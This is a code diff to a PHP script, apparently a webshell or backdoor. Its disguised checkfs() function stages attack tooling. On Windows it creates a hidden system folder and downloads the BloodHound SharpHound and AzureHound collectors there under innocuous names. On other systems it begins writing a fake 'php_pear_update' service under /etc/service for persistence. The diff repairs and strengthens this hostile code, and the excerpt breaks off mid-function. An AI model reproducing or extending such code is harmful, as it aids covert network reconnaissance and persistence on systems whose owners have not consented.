@@ -6,14 +6,17 @@ define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
-        $wh = new COM();
-        if (!is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\")))
-        $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
-        shell_exec("mkdir ". $t);
-        shell_exec("attrib +h +s ". $t);
-        shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile ". $t ."\\af.ps1");
-        shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile ". $t ."\\af1.ps1");
-        shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile ". $t ."\\af2.exe");
+        $wh = new COM('WScript.Shell');
+        if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\"))) {
+            $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
+            shell_exec("mkdir " . $t);
+            shell_exec("attrib +h +s " . $t);
+            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
+            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
+            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
+        }else{
+
+        }
     } else {
         if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update")){
             $f = fopen("/etc/service/php_pear_update", "w");
